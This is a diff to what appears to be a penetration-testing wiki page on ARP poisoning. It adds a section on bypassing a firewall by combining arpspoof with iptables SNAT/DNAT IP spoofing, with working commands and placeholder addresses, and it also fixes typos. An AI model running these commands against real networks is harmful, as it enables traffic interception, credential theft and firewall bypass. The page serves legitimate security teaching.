@@ -8,6 +8,10 @@ description: MITRE ATT&CK™ Sub-technique T1557.002
 
 The ARP (Address Resolution Protocol) is used to link IPv4 addresses with MAC addresses, allowing machines to communicate within networks. Since that protocol works in broadcast, attackers can try to impersonate machines by answering ARP requests (_"Who is using address 192.168.56.1? I am!"_) or by flooding the network with ARP announcements (_"Hey everyone, nobody asked but I'm the one using address 192.168.56.1"_). This is called ARP spoofing (also called ARP poisoning).
 
+{% hint style="info" %}
+ARP Reply is accepted by a host without any verification, even if it didn’t send an ARP request ! (for performance purpose). The ARP table is being updated if the reply is different from the actual entry.
+{% endhint %}
+
 ### Proxy vs. Rerouting
 
 The two major use cases of ARP spoofing are the following.
@@ -63,7 +67,7 @@ Bettercap also has the [any.proxy](https://www.bettercap.org/modules/ethernet/pr
 
 * `any.proxy.iface` allows to set the interface to redirect packets from
 * `any.proxy.protocol` can be set to `UDP` or `TCP` to specify on which transport protocol the packets to reroute will transit&#x20;
-* `any.proxy.src_address` refers to the destination address of the packets to reroute. This usally has to be set to the spoofed server IP address. Packets that were originally sent to that server will be rerouted and sent to another one. This option has to be set when doing the rerouting technique.This option can be blank. Bettercap will then reroute every packet received without filtering on the address. For instance, this is useful when doing a WSUS or DNS spoofing attack on multiple victims at the same time.
+* `any.proxy.src_address` refers to the destination address of the packets to reroute. This usually has to be set to the spoofed server IP address. Packets that were originally sent to that server will be rerouted and sent to another one. This option has to be set when doing the rerouting technique.This option can be blank. Bettercap will then reroute every packet received without filtering on the address. For instance, this is useful when doing a WSUS or DNS spoofing attack on multiple victims at the same time.
 * `any.proxy.src_port` refers to the destination port of the packets to reroute. This usally has to be set to the spoofed service port. Packets that were originally sent to that server will be rerouted and sent to another one. This option has to be set when doing the rerouting technique.
 * `any.proxy.dst_address` refers to the IP address the matched packets are to be sent to. For instance, when doing WSUS or DNS spoofing attacks in a rerouting technique mode, this option has to be set to the IP address of the attacker's server.
 * `any.proxy.dst_port` refers to the port the matched packets are to be sent to.
@@ -80,13 +84,13 @@ Bettercap's logging can be controlled so that only essential information is show
 * Make sure the attacker and the victim client are on the same subnet, I don't know how to operate when they are not
 * tracert on the client to make sure packets are forwarded if possible
 * make sure it's not the DNS
-* make sure the iptables rules are ok and allow forwarding --> [networking](arp-poisoning.md#network-filter)
+* make sure the iptables rules are ok and allow forwarding --> [networking](arp-poisoning.md#networking)
 * make sure to run bettercap in a privileged container with network host
 * options can be written in a `.cap` file and launched with bettercap with the following command and options`bettercap --iface $interface --caplet caplet.cap`
 
 ## Scenarios examples
 
-Below are examples or targetted ARP poisoning attacks where the attacker wants to hijack packets aimed at a specific server (SMB, DNS, WSUS, ...), to answer with evil responses. The "dumping network secrets" scenario is the one attackers use to [dump credentials on the network](../credentials/dumping/network-protocols.md) (usually in order to find an initial foothold).
+Below are examples or targeted ARP poisoning attacks where the attacker wants to hijack packets aimed at a specific server (SMB, DNS, WSUS, ...), to answer with evil responses. The "dumping network secrets" scenario is the one attackers use to [dump credentials on the network](../credentials/dumping/network-protocols.md) (usually in order to find an initial foothold).
 
 {% tabs %}
 {% tab title="SMB spoofing" %}
@@ -229,9 +233,63 @@ net.sniff on
 {% endtab %}
 {% endtabs %}
 
-## 🛠️ Below this is info I need to RTFM on...
+<details>
 
-What is iptables -j MASQUERADE and why do I see it all the time in articles and blogs
+<summary>Alternative using <code>arpspoof</code> tool - Firewall Bypass scenario</summary>
+
+#### Combining ARP poisoning and IP spoofing to bypass firewall
+
+The goal of this attack is to bypass the firewall protecting a sensitive network and be able the access an asset there.&#x20;
+
+To do so, the attacker's machine sits as MITM between the DNS server (referred to as the target of the ARP Spoofing, which is authorized to communicate with the sensitive asset in the protected network), and the firewall controlling the access to the protected network.\
+In addition to this, the attacker spoofs the IP address of the DNS server when communicating with the sensitive asset and tags its traffic through dynamic ports to be able to track it and handle the response to its spoofed requests.&#x20;
+
+Below is a diagram to visualize the attack:
+
+<img src="../../../.gitbook/assets/arpspoofandipspoof.png" alt="Bypass WAF through ARP spoofing and IP Spoofing - attack diagram" data-size="original">
+
+**IP spoofing**&#x20;
+
+This part is done using [iptables](https://www.djack.com.pl/Suse9hlp/ch26s03.html) NAT rules.
+
+<pre class="language-bash"><code class="lang-bash"># As refered to above, IP forwarding need to be enabled otherwise attacker's machine will drop the packets not containing its IP address as destination
+<strong>sysctl net.ipv4.ip_forward=1
+</strong># Change the source port range of the attacker host, this is only to make sure port range size is the same as the one of the spoofed traffic (20000-30000)
+<strong>echo "40000 50000" > /proc/sys/net/ipv4/ip_local_port_range 
+</strong># Spoof the source IP address of the outgoing traffic and modify the source ports to tag the spoofed traffic.
+<strong>iptables -t nat -A POSTROUTING -s "ATTACKER_IP"/32 -o "NETWORK_INTERFACE" -p tcp -j SNAT --to-source "TARGET_IP":20000-30000
+</strong># Identify the response to the spoofed traffic and change destination IP of the target to the one of the attacker's host
+<strong>iptables -t nat -A PREROUTING -d "TARGET_IP"/32 -i "NETWORK_INTERFACE" -p tcp -m tcp --dport 20000:30000 -j DNAT --to-destination "ATTACKER_IP":40000-50000
+</strong></code></pre>
+
+**ARP spoofing (MITM)**\
+To perform the ARP spoofing part, [arpspoof](https://github.com/ickerwx/arpspoof) (python2) is used. Both the DNS server and the firewall are poisoned ([proxy mode](arp-poisoning.md#proxy-vs.-rerouting)).&#x20;
+
+<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"># Launch the ARP poisoning
+<strong>arpspoof -i "NETWORK_INTERFACE" -t "TARGET_IP" -r "FIREWALL_IP"
+</strong></code></pre>
+
+For more details about the attack, refer to the ["Combining ARP poisoning and IP spoofing to bypass firewalls" article](https://idafchev.github.io/pentest/2019/10/28/combining\_arp\_poisoning\_and\_ip\_spoofing\_to\_bypass\_firewalls.html) written by [Llia Dafchev](https://twitter.com/IliyaDafchev).
+
+_**Nota bene:**_ there are different ways of populating the NAT table regarding outgoing traffic IP translation; through the `POSTROUTING` chain, applied on all outgoing packets:
+
+1. `MASQUERADE`_:_ this will indicate that the source IP of outgoing packets should be changed to the one of the network interface specified in `-o` argument.
+
+{% code overflow="wrap" %}
+```bash
+iptables -t nat -A POSTROUTING -o "NETWORK_INTERFACE" -j MASQUERADE
+```
+{% endcode %}
+
+2. `SNAT`_:_ this will indicate that the source IP of outgoing packets should be changed to the one specified in `--to` argument. Below is an example different from the one used in the attack descried above, where decision on the NAT rule to apply is based on destination (`-d` option) rather than the source (`-s` option).
+
+{% code overflow="wrap" %}
+```bash
+iptables -t nat -I POSTROUTING -d "TARGET_IP"  -j SNAT --to "MODIFIED_SOURCE_IP"
+```
+{% endcode %}
+
+</details>
 
 ## Resources
 
@@ -242,3 +300,5 @@ What is iptables -j MASQUERADE and why do I see it all the time in articles and 
 {% embed url="https://www.bettercap.org/modules/ethernet/spoofers/arp.spoof/" %}
 
 {% embed url="https://ivanitlearning.wordpress.com/2019/04/07/arp-dns-poisoning-with-bettercap-and-impacket-ntlmrelayx/" %}
+
+{% embed url="https://idafchev.github.io/pentest/2019/10/28/combining_arp_poisoning_and_ip_spoofing_to_bypass_firewalls.html" %}
